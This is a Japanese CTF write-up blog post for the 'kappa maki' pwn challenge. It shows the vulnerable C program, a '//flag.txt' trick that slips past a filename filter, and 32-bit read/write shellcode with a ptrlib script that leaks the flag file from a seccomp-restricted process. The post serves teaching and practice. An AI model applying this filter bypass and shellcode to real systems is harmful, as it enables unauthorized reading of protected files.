---
title: Daily AlpacaHack B-SIDE kappa maki Writeup
author: Ojun
slug: kappa-maki
featured: true
draft: false
pubDatetime: 2026-07-18T07:23:37.128Z
description: kappa makiのwriteup
tags:
  - tech
  - ctf
ogImage: "@/assets/images/2026/kappa-maki.jpg"
---

![kappa maki](@/assets/images/2026/kappa-maki.jpg)

今日で20歳になりました。お酒を飲めるようになりましたが、僕はあまり食べ物にお金をかけない主義なので、人付き合い以外で飲むことはないかもしれません。

最近解いたkappa makiという問題のWriteupがまだ投稿されていなかったので、投稿してしまおうかと思います。

## 概要
ソースコードを以下に貼ります。

```c
// gcc chall.c -o chall -lseccomp -fno-stack-protector -no-pie -z execstack

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <seccomp.h>
#include <sys/mman.h>

#define SHELLCODE_SIZE 0x1000
#define FILENAME_SIZE  0x100

void install_seccomp() {
    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    if (!ctx) exit(1);

    seccomp_arch_remove(ctx, SCMP_ARCH_X86_64);

    seccomp_arch_add(ctx, SCMP_ARCH_X86);

    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    seccomp_load(ctx);
    seccomp_release(ctx);
}

int main() {

    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    char filename[FILENAME_SIZE];
    memset(filename, 0, sizeof(filename));

    void *buf = mmap((void *)0x1020000,
                     SHELLCODE_SIZE,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS,
                     -1, 0);
    printf("buf address: %p\n", buf);
    fflush(stdout);
    write(1, "filename: ", 10);

    int len = read(0, filename, sizeof(filename)-1);
    if (len <= 0) return 1;

    filename[strcspn(filename, "\n")] = 0;

    if (!strcmp(filename, "flag.txt") ||
        !strcmp(filename, "/flag.txt")) {
        write(1, "Nope.\n", 6);
        return 1;
    }

    if (chroot("/home/pwn") != 0) {
        return 1;
    }

    chdir("/");

    int fd = open(filename, O_RDONLY);
    if (fd < 0) {
        write(1, "open error\n", 11);
        return 1;
    }
    if (fd != 10) {
        dup2(fd, 10);
        close(fd);
        fd = 10;
    }
    if (buf == MAP_FAILED) return 1;

    write(1, "shellcode: ", 11);
    read(0, buf, SHELLCODE_SIZE);

    install_seccomp();

    ((void(*)())buf)();

    return 0;
}
```

このプログラムの流れは次のようになっています:

- 読込み・書き込み・実行が可能な領域`buf`を確保する。
- `filename`を受け取る。
- `filename`が`flag.txt`または`/flag.txt`である場合、プログラムを強制終了する。
- ファイルディスクプリタ10を用いて、`filename`で指定されたファイルを開く。
- シェルコードを受け取る。
- seccompを導入する。
- シェルコードを実行する。

seccompとは、呼び出すことのできるシステムコールを制限する機能です。今回の場合、32bitの`read`および`write`システムコールのみ使用可能な状態となっています。
攻撃者はこのプログラムにシェルコードを注入することで任意のプログラムを実行できますが、使用できるシステムコールは`read`および`write`のみとなります。

シェルコードを実行する前の段階で、攻撃者が指定したファイルをファイルディスクプリタ10として`open`することができます。したがって、攻撃の流れは

- どうにかして`flag.txt`を`open`する。
- 適切なシェルコードを注入して、`open`した`flag.txt`の内容を読み、標準出力として書き出す。

というステップになります。

## 攻撃
まずは`flag.txt`を`open`する必要があります。`filename`として`flag.txt`または`/flag.txt`を指定すると弾かれてしまうので、対策が必要です。この対策は簡単で、例えば`//flag.txt`とすれば、文字列としては検知を回避でき、かつ`/flag.txt`と同じ意味になります。

これで、`flag.txt`をファイルディスクプリタ10で開くことが可能になりました。あとは適当に読み書きをするシェルコードを作ればよいです。少し丁寧に書きます。

まずはシステムコール番号を確認します。アーキテクチャが`i386`であることに注意。

```bash
❯ ausyscall i386 read | head -n 1
read               3
❯ ausyscall i386 write | head -n 1
write              4
```

それぞれ呼び出し規約は以下のようになります。

```c
ssize_t read(size_t count;
                  int fd, void buf[count], size_t count);
ssize_t write(size_t count;
              int fd, const void buf[count], size_t count);
```

さて、あとはシェルコードを構築すればよいです。`buf+0x500`あたりに`flag.txt`の中身を読んであげて、標準出力にwriteしてやればよいです。
ここで、x86では、システムコール番号を`eax`、引数を`ebx`、`ecx`、`edx`の順でレジスタに格納することに注意。また、32bitのシステムコールは`int 0x80`で呼び出します。以下のようなアセンブリを書けばよいです。

```asm
; read(10, buf+0x500, 100)
mov eax, 3
mov ebx, 10
mov ecx, {buf+0x500}
mov edx, 100
int 0x80

; write(stdout, buf+0x500, 100)
mov eax, 4
mov ebx, 1
mov ecx, {buf+0x500}
mov edx, 100
int 0x80
```

まとめると、以下のようなスクリプトを書くことで、この問題を解くことができます。

```python
from ptrlib import *

io = Socket("localhost", 1337)

buf = int(io.recvlineafter(b"address: ").decode(),16)
io.sendlineafter(b"name: ", b"//flag.txt")
asm = f"""
mov eax, 3
mov ebx, 10
mov ecx, {buf+0x500}
mov edx, 100
int 0x80

mov eax, 4
mov ebx, 1
mov ecx, {buf+0x500}
mov edx, 100
int 0x80
"""

print(nasm(asm, 32, 0))

io.sendlineafter(b"code: ", nasm(asm, 32, 0))
io.interactive()
```

## 補遺
かっぱ巻き、しばらく食べてないね。誰かお寿司おごってください。
